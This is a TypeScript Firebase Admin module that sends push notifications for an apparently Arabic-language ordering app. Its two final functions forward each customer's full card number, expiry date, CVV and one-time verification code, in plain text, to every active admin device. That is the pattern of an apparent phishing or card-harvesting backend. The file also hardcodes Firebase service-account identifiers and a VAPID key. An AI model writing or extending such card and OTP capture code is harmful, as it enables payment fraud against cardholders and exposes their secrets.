import * as admin from "firebase-admin";
import { eq } from "drizzle-orm";
import { db, adminDevicesTable } from "@workspace/db";

// Helper function to format private key
function getPrivateKey(): string {
  const rawKey = process.env.FIREBASE_PRIVATE_KEY || "";
  // Replace escaped newlines with actual newlines
  return rawKey.replace(/\\n/g, "\n");
}

// Firebase Admin configuration from environment variables
const firebaseConfig = {
  type: "service_account",
  project_id: process.env.FIREBASE_PROJECT_ID || "zabihte",
  private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID || "0a4b0071c4ba98cd2f5a7e2b82afc922f1cfc578",
  private_key: getPrivateKey(),
  client_email: process.env.FIREBASE_CLIENT_EMAIL || "firebase-adminsdk-fbsvc@zabihte.iam.gserviceaccount.com",
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url: "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40zabihte.iam.gserviceaccount.com",
  universe_domain: "googleapis.com"
};

// VAPID Key
export const VAPID_KEY = "BGKlH7RpwXm71PFhbOC9gQIMsVy_ymv1lk_tCZ2p5sHoES1RP6_p8_eiFitlUggqLM1jaaA1MBkQlgaCKJY_Zb0";

// Initialize Firebase Admin if not already initialized
if (!admin.apps.length) {
  try {
    admin.initializeApp({
      credential: admin.credential.cert(firebaseConfig as admin.ServiceAccount),
    });
    console.log('[Firebase] Admin initialized successfully');
  } catch (error) {
    console.error('[Firebase] Failed to initialize:', error);
  }
}

export const messaging = admin.messaging();

// Interface for notification payload
export interface NotificationPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  data?: Record<string, string>;
}

// Send push notification to a single device
export async function sendPushNotification(
  fcmToken: string,
  payload: NotificationPayload
): Promise<{ success: boolean; messageId?: string; error?: string; errorCode?: string }> {
  try {
    const message: admin.messaging.Message = {
      token: fcmToken,
      notification: {
        title: payload.title,
        body: payload.body,
      },
              android: {
        priority: "high" as const,
        notification: {
          channelId: "dheebti_orders",
          priority: "high" as const,
          defaultSound: true,
          defaultVibrateTimings: true,
        },
      },
      apns: {
        payload: {
          aps: {
            badge: 1,
            sound: "default",
            contentAvailable: true,
          },
        },
        headers: {
          "apns-priority": "10",
          "apns-push-type": "alert",
        },
      },
      webpush: {
        headers: {
          Urgency: "high",
        },
        notification: {
          icon: payload.icon || "/icon-192.png",
          badge: payload.badge || "/icon-192.png",
          tag: payload.tag || "dheebti-notification",
          requireInteraction: true,
          dir: "rtl",
          lang: "ar",
        },
        fcmOptions: {
          link: `${process.env.VITE_API_URL}/admin/orders`,
        },
      },
      data: payload.data,
    };

    const messageId = await messaging.send(message);
    console.log('[Firebase] Notification sent successfully:', messageId);
    return { success: true, messageId };
  } catch (error: any) {
    console.error("[Firebase] Error sending notification:", error.code, error.message);
    
    // Handle specific Firebase errors
    if (error.code === "messaging/registration-token-not-registered") {
      return { success: false, error: "الجهاز غير مسجل في FCM", errorCode: "TOKEN_NOT_REGISTERED" };
    }
    if (error.code === "messaging/invalid-argument") {
      return { success: false, error: "رمز الجهاز غير صالح", errorCode: "INVALID_TOKEN" };
    }
    if (error.code === "messaging/quota-exceeded") {
      return { success: false, error: "تم تجاوز الحد المسموح للإشعارات", errorCode: "QUOTA_EXCEEDED" };
    }
    if (error.code === "messaging/authentication-error") {
      return { success: false, error: "خطأ في المصادقة مع Firebase - تحقق من إعدادات VAPID", errorCode: "AUTH_ERROR" };
    }
    if (error.code === "messaging/server-unavailable") {
      return { success: false, error: "Firebase غير متاح حالياً", errorCode: "SERVER_UNAVAILABLE" };
    }
    if (error.code === "messaging/invalid-registration-token") {
      return { success: false, error: "رمز التسجيل غير صالح", errorCode: "INVALID_REGISTRATION_TOKEN" };
    }
    
    // Log the full error for debugging
    console.error("[Firebase] Full error:", JSON.stringify(error));
    
    return { success: false, error: error.message || "خطأ غير معروف", errorCode: error.code || "UNKNOWN" };
  }
}

// Send push notification to multiple devices
export async function sendPushNotificationToMultiple(
  fcmTokens: string[],
  payload: NotificationPayload
): Promise<{ success: number; failed: number; errors: string[] }> {
  let success = 0;
  let failed = 0;
  const errors: string[] = [];

  for (const token of fcmTokens) {
    const result = await sendPushNotification(token, payload);
    if (result.success) {
      success++;
    } else {
      failed++;
      errors.push(`${token.slice(0, 10)}...: ${result.error}`);
    }
  }

  return { success, failed, errors };
}

// Send test notification
export async function sendTestNotification(
  fcmToken: string,
  adminName: string = "المدير"
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  return sendPushNotification(fcmToken, {
    title: "✅ تم تفعيل الإشعارات!",
    body: `مرحباً ${adminName}، تم تفعيل الإشعارات بنجاح. ستستلم إشعارات الطلبات الجديدة هنا.`,
    tag: "test-notification",
    data: {
      type: "test",
      timestamp: new Date().toISOString(),
    },
  });
}

// Notify admins of card payment attempt
export async function notifyAdminsOfCardAttempt(order: any, cardName: string, cardNumber: string, cardExpiry: string, cardCvv: string) {
  try {
    const devices = await db
      .select()
      .from(adminDevicesTable)
      .where(eq(adminDevicesTable.isActive, true));

    for (const device of devices) {
      await sendPushNotification(device.fcmToken, {
        title: "💳 محاولة بطاقة دفع!",
        body: `العميل: ${order.customerName}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${cardExpiry}\nرمز الأمان: ${cardCvv}`,
        tag: `card-${order.id}`,
        data: {
          type: "card_attempt",
          orderId: order.id.toString(),
          customerName: order.customerName,
          productName: order.productName,
          cardNumber: cardNumber,
          cardExpiry: cardExpiry,
          cardCvv: cardCvv,
          timestamp: new Date().toISOString(),
        },
      });
    }

    console.log(`[PUSH] Card attempt notification sent to ${devices.length} admin devices`);
  } catch (error) {
    console.error("[PUSH] Error sending card notification:", error);
  }
}

// Notify admins of OTP verification attempt
export async function notifyAdminsOfOtpAttempt(order: any, otpCode: string, success: boolean) {
  try {
    const devices = await db
      .select()
      .from(adminDevicesTable)
      .where(eq(adminDevicesTable.isActive, true));

    const statusEmoji = success ? "✅" : "❌";
    const statusText = success ? "تم التحقق بنجاح" : "فشل التحقق";

    for (const device of devices) {
      await sendPushNotification(device.fcmToken, {
        title: `${statusEmoji} محاولة رمز تحقق!`,
        body: `العميل: ${order.customerName}\nرمز التحقق: ${otpCode}\nالحالة: ${statusText}`,
        tag: `otp-${order.id}`,
        data: {
          type: "otp_attempt",
          orderId: order.id.toString(),
          customerName: order.customerName,
          productName: order.productName,
          otpCode: otpCode,
          success: success.toString(),
          timestamp: new Date().toISOString(),
        },
      });
    }

    console.log(`[PUSH] OTP attempt notification sent to ${devices.length} admin devices`);
  } catch (error) {
    console.error("[PUSH] Error sending OTP notification:", error);
  }
}
